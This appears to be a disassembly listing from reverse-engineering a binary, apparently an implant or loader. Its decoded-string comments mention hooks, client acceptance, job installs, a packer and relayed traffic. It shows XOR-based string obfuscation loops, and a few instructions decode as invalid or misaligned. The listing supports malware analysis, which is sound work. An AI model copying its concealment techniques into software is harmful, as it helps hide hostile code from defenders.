5ea5	jmp    0x5eab
5ea7	lea    r13,[rax+0x1]
5eab	lea    rax,[r13-0x1]
5eaf	and    eax,0xf
5eb2	lea    rdx,[rax+rax*4]
5eb6	shl    rdx,0x5
5eba	mov    rdi,QWORD PTR [rip+0xa0867]        # 0xa6728
5ec1	xor    ecx,ecx
5ec3	xor    eax,eax
5ec5	lock cmpxchg QWORD PTR [rdx+rdi*1+0xa0],rcx
5ecf	cmp    rax,r13
5ed2	jne    0x5fa3
5ed8	movups xmm0,XMMWORD PTR [rdx+rdi*1+0xac]
5ee0	movups XMMWORD PTR [rbp+0x4c0],xmm0
5ee7	movups xmm1,XMMWORD PTR [rdx+rdi*1+0xbc]
5eef	movups XMMWORD PTR [rbp+0x4d0],xmm1
5ef6	movups xmm0,XMMWORD PTR [rdx+rdi*1+0xcc]
5efe	movups XMMWORD PTR [rbp+0x10],xmm0
5f02	movups xmm1,XMMWORD PTR [rdx+rdi*1+0xdc]
5f0a	movaps XMMWORD PTR [rbp+0x500],xmm1
5f11	movups xmm0,XMMWORD PTR [rdx+rdi*1+0xec]
5f19	movaps XMMWORD PTR [rbp+0x510],xmm0
5f20	movups xmm1,XMMWORD PTR [rdx+rdi*1+0xfc]
5f28	movaps XMMWORD PTR [rbp+0x520],xmm1
5f2f	movups xmm0,XMMWORD PTR [rdx+rdi*1+0x10c]
5f37	movaps XMMWORD PTR [rbp+0x530],xmm0
5f3e	movups xmm1,XMMWORD PTR [rdx+rdi*1+0x11c]
5f46	movaps XMMWORD PTR [rbp+0x540],xmm1
5f4d	movups xmm0,XMMWORD PTR [rdx+rdi*1+0x12c]
5f55	movaps XMMWORD PTR [rbp+0x550],xmm0
5f5c	mov    BYTE PTR [rbp+0x4df],cl
5f62	mov    BYTE PTR [rbp+0x1f],cl
5f65	mov    BYTE PTR [rbp+0x55f],cl
5f6b	lock or DWORD PTR [rsp],ecx
5f6f	xor    eax,eax
5f71	lock cmpxchg QWORD PTR [rdx+rdi*1+0xa0],rcx
5f7b	cmp    rax,r13
5f7e	jne    0x5fa3
5f80	lea    rax,[rbp+0x500]
5f87	mov    QWORD PTR [rsp+0x20],rax
5f8c	lea    r9,[rbp+0x10]
5f90	lea    r8,[rbp+0x4c0]
5f97	lea    rdx,[rip+0x5661a]        # 0x5c5b8   ; "A:hooks"
5f9e	call   0x294a0
5fa3	mov    rax,QWORD PTR [rip+0xa077e]        # 0xa6728
5faa	add    rax,0x98
5fb0	xchg   QWORD PTR [rax],r13
5fb3	mov    rdx,QWORD PTR [rip+0xa076e]        # 0xa6728
5fba	xor    ecx,ecx
5fbc	xor    eax,eax
5fbe	lock cmpxchg QWORD PTR [rdx+0x90],rcx
5fc7	mov    rdi,rax
5fca	mov    rdx,QWORD PTR [rip+0xa0757]        # 0xa6728
5fd1	xor    eax,eax
5fd3	lock cmpxchg QWORD PTR [rdx+0x98],rcx
5fdc	cmp    rax,rdi
5fdf	jb     0x5e86
5fe5	movzx  eax,BYTE PTR [rip+0xa0744]        # 0xa6730
5fec	test   al,al
5fee	je     0x666f
5ff4	mov    rdx,QWORD PTR [rip+0xa072d]        # 0xa6728
5ffb	test   rdx,rdx
5ffe	je     0x666f
6004	cmp    DWORD PTR [rdx+0x4],0x1
6008	jne    0x666f
600e	xor    ecx,ecx
6010	xor    eax,eax
6012	lock cmpxchg QWORD PTR [rdx+0x30],rcx
6018	mov    rdi,rax
601b	mov    rdx,QWORD PTR [rip+0xa0706]        # 0xa6728
6022	xor    eax,eax
6024	lock cmpxchg QWORD PTR [rdx+0x38],rcx
602a	cmp    rdi,rax
602d	jne    0x666f
6033	xor    edi,edi
6035	mov    DWORD PTR [rsp+0x44],edi
6039	nop    DWORD PTR [rax+0x0]
6040	mov    rdx,QWORD PTR [rip+0xa06e1]        # 0xa6728
6047	xor    ecx,ecx
6049	xor    eax,eax
604b	lock cmpxchg QWORD PTR [rdx+0x18],rcx
6051	mov    r13,rax
6054	test   al,0x1
6056	jne    0x6155
605c	mov    rdx,QWORD PTR [rip+0xa06c5]        # 0xa6728
6063	xor    eax,eax
6065	lock cmpxchg QWORD PTR [rdx+0x20],rcx
606b	mov    r8,rax
606e	mov    QWORD PTR [rbp+0x10],rax
6072	je     0x666f
6078	cmp    rax,QWORD PTR [rip+0xa06c9]        # 0xa6748
607f	je     0x611e
6085	mov    QWORD PTR [rip+0xa06bc],rax        # 0xa6748
608c	xor    edx,edx
608e	mov    r8d,0xa0
6094	lea    rcx,[rbp+0x680]
609b	call   0x478c0
60a0	mov    rdx,QWORD PTR [rip+0xa0681]        # 0xa6728
60a7	xor    ecx,ecx
60a9	xor    eax,eax
60ab	lock cmpxchg QWORD PTR [rdx+0x38],rcx
60b1	mov    rdi,rax
60b4	mov    rdx,QWORD PTR [rip+0xa066d]        # 0xa6728
60bb	xor    eax,eax
60bd	lock cmpxchg QWORD PTR [rdx+0x30],rcx
60c3	mov    QWORD PTR [rsp+0x30],rdi
60c8	mov    QWORD PTR [rsp+0x28],rax
60cd	mov    QWORD PTR [rsp+0x20],r13
60d2	mov    r9,QWORD PTR [rip+0xa065f]        # 0xa6738
60d9	mov    r8,QWORD PTR [rbp+0x10]
60dd	lea    rdx,[rip+0x564dc]        # 0x5c5c0   ; "A:generation=%llu consumed=%llu seq=%llu epoch_request=%llu epoch_applied=%llu"
60e4	lea    rcx,[rbp+0x680]
60eb	call   0x8500
60f0	lea    rax,[rbp+0x680]
60f7	mov    QWORD PTR [rsp+0x20],rax
60fc	lea    r9,[rip+0x51201]        # 0x57304
6103	lea    r8,[rip+0x56506]        # 0x5c610   ; "A:h_client_candidate"
610a	lea    rdx,[rip+0x564a7]        # 0x5c5b8   ; "A:hooks"
6111	call   0x294a0
6116	mov    edi,DWORD PTR [rsp+0x44]
611a	mov    r8,QWORD PTR [rbp+0x10]
611e	cmp    r8,QWORD PTR [rip+0xa0613]        # 0xa6738
6125	je     0x666f
612b	mov    rax,QWORD PTR [rip+0xa05f6]        # 0xa6728
6132	movups xmm6,XMMWORD PTR [rax+0x40]
6136	lock or DWORD PTR [rsp],0x0
613b	mov    rdx,QWORD PTR [rip+0xa05e6]        # 0xa6728
6142	xor    ecx,ecx
6144	xor    eax,eax
6146	lock cmpxchg QWORD PTR [rdx+0x18],rcx
614c	cmp    r13,rax
614f	jne    0x6155
6151	test   al,0x1
6153	je     0x6169
6155	inc    edi
6157	mov    DWORD PTR [rsp+0x44],edi
615b	cmp    edi,0x10
615e	jl     0x6040
6164	jmp    0x666f
6169	mov    rdx,QWORD PTR [rip+0xa05b8]        # 0xa6728
6170	xor    eax,eax
6172	lock cmpxchg QWORD PTR [rdx+0x30],rcx
6178	mov    rdi,rax
617b	mov    rdx,QWORD PTR [rip+0xa05a6]        # 0xa6728
6182	xor    eax,eax
6184	lock cmpxchg QWORD PTR [rdx+0x38],rcx
618a	cmp    rdi,rax
618d	jne    0x666f
6193	mov    QWORD PTR [rip+0xa059e],r8        # 0xa6738
619a	xorps  xmm0,xmm0
619d	movups XMMWORD PTR [rbp+0x4c0],xmm0
61a4	movups XMMWORD PTR [rbp+0x4d0],xmm0
61ab	movups XMMWORD PTR [rbp+0x4e0],xmm0
61b2	movups XMMWORD PTR [rbp+0x4f0],xmm0
61b9	lea    rdx,[rip+0x56468]        # 0x5c628   ; "A:generation=%llu"
61c0	lea    rcx,[rbp+0x4c0]
61c7	call   0xcdd0
61cc	lea    rax,[rbp+0x4c0]
61d3	mov    QWORD PTR [rsp+0x20],rax
61d8	lea    r9,[rip+0x51125]        # 0x57304
61df	lea    r8,[rip+0x5645a]        # 0x5c640   ; "A:h_client_accepted"
61e6	lea    rdx,[rip+0x563cb]        # 0x5c5b8   ; "A:hooks"
61ed	call   0x294a0
61f2	mov    rax,QWORD PTR [rip+0xa051f]        # 0xa6718
61f9	mov    r13,QWORD PTR [rbp+0x10]
61fd	cmp    r13,rax
6200	je     0x666f
6206	movups XMMWORD PTR [rbp+0x1d0],xmm6
620d	mov    QWORD PTR [rbp+0x1e8],r13
6214	mov    QWORD PTR [rip+0xa04fd],r13        # 0xa6718
621b	lea    rdi,[rbp+0x3f0]
6222	xor    eax,eax
6224	mov    ecx,0x10
6229	rep stos BYTE PTR [rdi],al
622b	xorps  xmm0,xmm0
622e	movups XMMWORD PTR [rbp+0x420],xmm0
6235	movups XMMWORD PTR [rbp+0x430],xmm0
623c	movups XMMWORD PTR [rbp+0x440],xmm0
6243	movups XMMWORD PTR [rbp+0x450],xmm0
624a	movups XMMWORD PTR [rbp+0x460],xmm0
6251	movups XMMWORD PTR [rbp+0x470],xmm0
6258	cmp    QWORD PTR [rip+0xa02f1],rax        # 0xa6550
625f	je     0x644f
6265	cmp    DWORD PTR [rip+0x65e59],eax        # 0x6c0c4
626b	jl     0x644f
6271	lea    rcx,[rip+0xa0300]        # 0xa6578
6278	push   rbp
6279	call   0x22aba5
627e	cmp    QWORD PTR [rip+0xa02c2],0x0        # 0xa6548
6286	je     0x62b7
6288	mov    r8d,0x10
628e	lea    rdx,[rbp+0x1d0]
6295	lea    rcx,[rip+0xa02c4]        # 0xa6560
629c	call   0x477c0
62a1	test   eax,eax
62a3	jne    0x62b7
62a5	lea    rcx,[rip+0xa02cc]        # 0xa6578
62ac	call   0x3f3551
62b1	shr    cl,0xc3
62b4	(bad)
62b5	add    BYTE PTR [rax],al
62b7	lea    rcx,[rip+0xa02ba]        # 0xa6578
62be	push   rsi
62bf	call   0xb968b
62c4	movups XMMWORD PTR [rbp+0x4c0],xmm6
62cb	movups XMMWORD PTR [rbp+0x4d0],xmm6
62d2	xor    eax,eax
62d4	mov    QWORD PTR [rbp+0x188],rax
62db	mov    DWORD PTR [rsp+0x30],eax
62df	mov    DWORD PTR [rsp+0x28],0x20
62e7	lea    rax,[rbp+0x4c0]
62ee	mov    QWORD PTR [rsp+0x20],rax
62f3	xor    r9d,r9d
62f6	xor    r8d,r8d
62f9	lea    rdx,[rbp+0x188]
6300	mov    rcx,QWORD PTR [rip+0xa0249]        # 0xa6550
6307	push   rbx
6308	call   0xb154c
630d	mov    r13d,eax
6310	lea    rdi,[rbp+0x4c0]
6317	xor    eax,eax
6319	mov    ecx,0x20
631e	rep stos BYTE PTR [rdi],al
6320	test   r13d,r13d
6323	jns    0x684e
6329	mov    rcx,QWORD PTR [rbp+0x188]
6330	test   rcx,rcx
6333	je     0x633b
6335	push   rax
6336	call   0x388ff8
633b	movaps xmm0,XMMWORD PTR [rip+0x5327e]        # 0x595c0
6342	movaps XMMWORD PTR [rbp+0x1d0],xmm0
6349	movaps xmm0,XMMWORD PTR [rip+0x53280]        # 0x595d0
6350	movaps XMMWORD PTR [rbp+0x1e0],xmm0
6357	movaps xmm0,XMMWORD PTR [rip+0x53282]        # 0x595e0
635e	movaps XMMWORD PTR [rbp+0x1f0],xmm0
6365	movaps xmm0,XMMWORD PTR [rip+0x53284]        # 0x595f0
636c	movaps XMMWORD PTR [rbp+0x200],xmm0
6373	movaps xmm0,XMMWORD PTR [rip+0x53286]        # 0x59600
637a	movaps XMMWORD PTR [rbp+0x210],xmm0
6381	movaps xmm0,XMMWORD PTR [rip+0x53288]        # 0x59610
6388	movaps XMMWORD PTR [rbp+0x220],xmm0
638f	movaps xmm0,XMMWORD PTR [rip+0x5328a]        # 0x59620
6396	movaps XMMWORD PTR [rbp+0x230],xmm0
639d	mov    eax,DWORD PTR [rip+0x5328d]        # 0x59630
63a3	mov    DWORD PTR [rbp+0x240],eax
63a9	xorps  xmm0,xmm0
63ac	xor    eax,eax
63ae	movups XMMWORD PTR [rbp+0x500],xmm0
63b5	movups XMMWORD PTR [rbp+0x510],xmm0
63bc	movups XMMWORD PTR [rbp+0x520],xmm0
63c3	movups XMMWORD PTR [rbp+0x530],xmm0
63ca	movups XMMWORD PTR [rbp+0x540],xmm0
63d1	movups XMMWORD PTR [rbp+0x550],xmm0
63d8	movups XMMWORD PTR [rbp+0x560],xmm0
63df	mov    WORD PTR [rbp+0x570],ax
63e6	xor    edi,edi
63e8	mov    ebx,0x8b
63ed	nop    DWORD PTR [rax]
63f0	mov    rdx,rdi
63f3	shr    rdx,0x3
63f7	movzx  eax,di
63fa	imul   ecx,eax,0xd
63fd	add    dx,cx
6400	add    dx,bx
6403	xor    dx,WORD PTR [rbp+rdi*2+0x1d0]
640b	mov    WORD PTR [rsp+0x44],dx
6410	movzx  eax,WORD PTR [rsp+0x44]
6415	mov    WORD PTR [rbp+rdi*2+0x500],ax
641d	inc    rdi
6420	cmp    rdi,0x39
6424	jb     0x63f0
6426	mov    ebx,DWORD PTR [rip+0x557e8]        # 0x5bc14
642c	mov    edx,r13d
642f	lea    rcx,[rbp+0x500]
6436	call   0x8a20
643b	lea    rdi,[rbp+0x500]
6442	xor    eax,eax
6444	mov    ecx,0x72
6449	rep stos BYTE PTR [rdi],al
644b	mov    r13,QWORD PTR [rbp+0x10]
644f	movups XMMWORD PTR [rbp+0x4c0],xmm13
6457	movups XMMWORD PTR [rbp+0x4d0],xmm12
645f	movups XMMWORD PTR [rbp+0x4dc],xmm11
6467	mov    BYTE PTR [rbp+0x4ec],0x1b
646e	xorps  xmm0,xmm0
6471	movups XMMWORD PTR [rbp+0x1d0],xmm0
6478	movups XMMWORD PTR [rbp+0x1e0],xmm0
647f	movups XMMWORD PTR [rbp+0x1ec],xmm0
6486	xor    edi,edi
6488	nop    DWORD PTR [rax+rax*1+0x0]
6490	mov    rdx,rdi
6493	shr    rdx,0x3
6497	movzx  eax,dil
649b	imul   ecx,eax,0xd   ; DEC "received job=%llu q=%u slot1=install_failed"
649e	add    dl,0x1b
64a1	add    dl,cl
64a3	xor    dl,BYTE PTR [rbp+rdi*1+0x4c0]
64aa	mov    BYTE PTR [rsp+0x44],dl
64ae	movzx  eax,BYTE PTR [rsp+0x44]
64b3	mov    BYTE PTR [rbp+rdi*1+0x1d0],al
64ba	inc    rdi
64bd	cmp    rdi,0x2c
64c1	jb     0x6490
64c3	xor    r9d,r9d
64c6	mov    r8,r13
64c9	lea    rdx,[rbp+0x1d0]
64d0	lea    rcx,[rbp+0x420]
64d7	call   0x8560
64dc	lea    rdi,[rbp+0x1d0]
64e3	xor    eax,eax
64e5	mov    ecx,0x2c
64ea	rep stos BYTE PTR [rdi],al
64ec	mov    eax,DWORD PTR [rip+0x50642]        # 0x56b34
64f2	mov    DWORD PTR [rbp+0xb8],eax
64f8	movzx  eax,BYTE PTR [rip+0x50639]        # 0x56b38
64ff	mov    BYTE PTR [rbp+0xbc],al
6505	mov    BYTE PTR [rbp+0xbd],0xfc
650c	xor    eax,eax
650e	mov    DWORD PTR [rbp-0x58],eax
6511	mov    BYTE PTR [rbp-0x54],al
6514	xor    edi,edi
6516	data16 nop WORD PTR [rax+rax*1+0x0]
6520	mov    rdx,rdi
6523	shr    rdx,0x3
6527	movzx  eax,dil
652b	imul   ecx,eax,0xd   ; DEC "fail"
652e	add    dl,0xfc
6531	add    dl,cl
6533	xor    dl,BYTE PTR [rbp+rdi*1+0xb8]
653a	mov    BYTE PTR [rsp+0x44],dl
653e	movzx  eax,BYTE PTR [rsp+0x44]
6543	mov    BYTE PTR [rbp+rdi*1-0x58],al
6547	inc    rdi
654a	cmp    rdi,0x5
654e	jb     0x6520
6550	movsd  QWORD PTR [rbp+0x140],xmm8
6559	movzx  eax,BYTE PTR [rip+0x50430]        # 0x56990
6560	mov    BYTE PTR [rbp+0x148],al
6566	mov    BYTE PTR [rbp+0x149],0xfc
656d	xor    eax,eax
656f	mov    QWORD PTR [rsp+0x70],rax
6574	mov    BYTE PTR [rsp+0x78],al
6578	xor    edi,edi
657a	nop    WORD PTR [rax+rax*1+0x0]
6580	mov    rdx,rdi
6583	shr    rdx,0x3
6587	movzx  eax,dil
658b	imul   ecx,eax,0xd   ; DEC "phase1_h"
658e	add    dl,0xfc
6591	add    dl,cl
6593	xor    dl,BYTE PTR [rbp+rdi*1+0x140]
659a	mov    BYTE PTR [rsp+0x44],dl
659e	movzx  eax,BYTE PTR [rsp+0x44]
65a3	mov    BYTE PTR [rsp+rdi*1+0x70],al
65a7	inc    rdi
65aa	cmp    rdi,0x9
65ae	jb     0x6580
65b0	mov    DWORD PTR [rbp+0x170],r14d
65b7	movzx  eax,WORD PTR [rip+0x50916]        # 0x56ed4
65be	mov    WORD PTR [rbp+0x174],ax
65c5	movzx  eax,BYTE PTR [rip+0x5090a]        # 0x56ed6
65cc	mov    BYTE PTR [rbp+0x176],al
65d2	mov    BYTE PTR [rbp+0x177],0xfc
65d9	xor    eax,eax
65db	mov    DWORD PTR [rsp+0x50],eax
65df	mov    WORD PTR [rsp+0x54],ax
65e4	mov    BYTE PTR [rsp+0x56],al
65e8	xor    edi,edi
65ea	nop    WORD PTR [rax+rax*1+0x0]
65f0	mov    rdx,rdi
65f3	shr    rdx,0x3
65f7	movzx  eax,dil
65fb	imul   ecx,eax,0xd   ; DEC "packer"
65fe	add    dl,0xfc
6601	add    dl,cl
6603	xor    dl,BYTE PTR [rbp+rdi*1+0x170]
660a	mov    BYTE PTR [rsp+0x44],dl
660e	movzx  eax,BYTE PTR [rsp+0x44]
6613	mov    BYTE PTR [rsp+rdi*1+0x50],al
6617	inc    rdi
661a	cmp    rdi,0x7
661e	jb     0x65f0
6620	lea    r9,[rbp+0x420]
6627	lea    r8,[rbp-0x58]
662b	lea    rdx,[rsp+0x70]
6630	lea    rcx,[rsp+0x50]
6635	call   0x29d90
663a	lea    rdi,[rsp+0x50]
663f	xor    eax,eax
6641	mov    ecx,0x7
6646	rep stos BYTE PTR [rdi],al
6648	lea    rdi,[rsp+0x70]
664d	mov    ecx,0x9
6652	rep stos BYTE PTR [rdi],al
6654	lea    rdi,[rbp-0x58]
6658	mov    ecx,0x5
665d	rep stos BYTE PTR [rdi],al
665f	lea    rdi,[rbp+0x1d0]
6666	xor    eax,eax
6668	mov    ecx,0x10
666d	rep stos BYTE PTR [rdi],al
666f	call   0x28f592
6674	sbb    eax,0x4ce88b4c
6679	mov    ecx,DWORD PTR [rip+0xa0079]        # 0xa66f8
667f	cmp    BYTE PTR [rbp-0x7f],0x0
6683	jne    0x6b84
6689	test   r9,r9
668c	je     0x6b84
6692	mov    BYTE PTR [rbp-0x7f],0x1
6696	xorps  xmm0,xmm0
6699	movups XMMWORD PTR [rbp+0x500],xmm0
66a0	movups XMMWORD PTR [rbp+0x510],xmm0
66a7	movups XMMWORD PTR [rbp+0x520],xmm0
66ae	movups XMMWORD PTR [rbp+0x530],xmm0
66b5	movups XMMWORD PTR [rbp+0x540],xmm0
66bc	movups XMMWORD PTR [rbp+0x550],xmm0
66c3	movups XMMWORD PTR [rbp+0x560],xmm0
66ca	movups XMMWORD PTR [rbp+0x570],xmm0
66d1	mov    r8,QWORD PTR [rip+0xa0030]        # 0xa6708
66d8	movups xmm0,XMMWORD PTR [rip+0x4fb89]        # 0x56268   ; "A:cOAV4iD"
66df	movups XMMWORD PTR [rbp+0x3f0],xmm0
66e6	movsd  xmm0,QWORD PTR [rip+0x4fb8a]        # 0x56278
66ee	movsd  QWORD PTR [rbp+0x400],xmm0
66f6	mov    BYTE PTR [rbp+0x408],0x13
66fd	xorps  xmm0,xmm0
6700	xor    eax,eax
6702	movups XMMWORD PTR [rbp+0x4c0],xmm0
6709	mov    QWORD PTR [rbp+0x4d0],rax
6710	xor    edi,edi
6712	mov    rdx,rdi
6715	shr    rdx,0x3
6719	movzx  eax,dil
671d	imul   ecx,eax,0xd   ; DEC "polls=%llu packets=%llu"
6720	add    dl,0x13
6723	add    dl,cl
6725	xor    dl,BYTE PTR [rbp+rdi*1+0x3f0]
672c	mov    BYTE PTR [rsp+0x44],dl
6730	movzx  eax,BYTE PTR [rsp+0x44]
6735	mov    BYTE PTR [rbp+rdi*1+0x4c0],al
673c	inc    rdi
673f	cmp    rdi,0x18
6743	jb     0x6712
6745	lea    rdx,[rbp+0x4c0]
674c	lea    rcx,[rbp+0x500]
6753	call   0x85c0
6758	lea    rdi,[rbp+0x4c0]
675f	xor    eax,eax
6761	mov    ecx,0x18
6766	rep stos BYTE PTR [rdi],al
6768	mov    WORD PTR [rbp+0x180],r12w
6770	movzx  eax,BYTE PTR [rip+0x5070b]        # 0x56e82
6777	mov    BYTE PTR [rbp+0x182],al
677d	mov    BYTE PTR [rbp+0x183],0xb5
6784	xor    eax,eax
6786	mov    WORD PTR [rsp+0x58],ax
678b	mov    BYTE PTR [rsp+0x5a],al
678f	xor    edi,edi
6791	mov    rdx,rdi
6794	shr    rdx,0x3
6798	movzx  eax,dil
679c	imul   ecx,eax,0xd   ; DEC "ok"
679f	add    dl,0xb5
67a2	add    dl,cl
67a4	xor    dl,BYTE PTR [rbp+rdi*1+0x180]
67ab	mov    BYTE PTR [rsp+0x44],dl
67af	movzx  eax,BYTE PTR [rsp+0x44]
67b4	mov    BYTE PTR [rsp+rdi*1+0x58],al
67b8	inc    rdi
67bb	cmp    rdi,0x3
67bf	jb     0x6791
67c1	movsd  QWORD PTR [rbp-0x50],xmm10
67c7	mov    eax,DWORD PTR [rip+0x5060b]        # 0x56dd8
67cd	mov    DWORD PTR [rbp-0x48],eax
67d0	movzx  eax,WORD PTR [rip+0x50605]        # 0x56ddc
67d7	mov    WORD PTR [rbp-0x44],ax
67db	mov    BYTE PTR [rbp-0x42],0xb5
67df	xor    eax,eax
67e1	mov    QWORD PTR [rbp-0x68],rax
67e5	mov    DWORD PTR [rbp-0x60],eax
67e8	mov    WORD PTR [rbp-0x5c],ax
67ec	xor    edi,edi
67ee	xchg   ax,ax
67f0	mov    rdx,rdi
67f3	shr    rdx,0x3
67f7	movzx  eax,dil
67fb	imul   ecx,eax,0xd   ; DEC "relay_traffic"
67fe	add    dl,0xb5
6801	add    dl,cl
6803	xor    dl,BYTE PTR [rbp+rdi*1-0x50]
6807	mov    BYTE PTR [rsp+0x44],dl
680b	movzx  eax,BYTE PTR [rsp+0x44]
6810	mov    BYTE PTR [rbp+rdi*1-0x68],al
6814	inc    rdi
6817	cmp    rdi,0xe
681b	jb     0x67f0
681d	lea    r8,[rbp+0x500]
6824	lea    rdx,[rsp+0x58]
6829	lea    rcx,[rbp-0x68]
682d	call   0x15a0
6832	lea    rdi,[rbp-0x68]
6836	xor    eax,eax
6838	mov    ecx,0xe
683d	rep stos BYTE PTR [rdi],al
683f	lea    rdi,[rsp+0x58]
6844	mov    ecx,0x3
6849	jmp    0x6d49
684e	lea    rcx,[rip+0x9fd23]        # 0xa6578
6855	call   0x3540c0
685a	in     al,0x48
685c	mov    edi,DWORD PTR [rip+0x9fce6]        # 0xa6548
6862	mov    rax,QWORD PTR [rbp+0x188]
6869	mov    QWORD PTR [rip+0x9fcd8],rax        # 0xa6548
6870	movaps XMMWORD PTR [rip+0x9fce9],xmm6        # 0xa6560
6877	mov    BYTE PTR [rip+0x9fcf2],0x1        # 0xa6570
687e	lea    rcx,[rip+0x9fcf3]        # 0xa6578
6885	call   0x35be61
688a	jmp    0x68d4
688c	test   edi,edi
688e	je     0x6899
6890	mov    rcx,rdi
6893	push   rcx
6894	call   0x34b42b
6899	lea    rax,[rbp+0x250]
68a0	lea    rcx,[rip+0x52bf9]        # 0x594a0
68a7	mov    edx,0x2
68ac	mov    edi,0x80
68b1	movups xmm0,XMMWORD PTR [rcx]
68b4	movups XMMWORD PTR [rax],xmm0
68b7	movups xmm1,XMMWORD PTR [rcx+0x10]
68bb	movups XMMWORD PTR [rax+0x10],xmm1
68bf	movups xmm0,XMMWORD PTR [rcx+0x20]
68c3	movups XMMWORD PTR [rax+0x20],xmm0
68c7	movups xmm1,XMMWORD PTR [rcx+0x30]
68cb	movups XMMWORD PTR [rax+0x30],xmm1
68cf	movups xmm0,XMMWORD PTR [rcx+0x40]
68d3	movups XMMWORD PTR [rax+0x40],xmm0
68d7	movups xmm1,XMMWORD PTR [rcx+0x50]
68db	movups XMMWORD PTR [rax+0x50],xmm1
68df	movups xmm0,XMMWORD PTR [rcx+0x60]
68e3	movups XMMWORD PTR [rax+0x60],xmm0
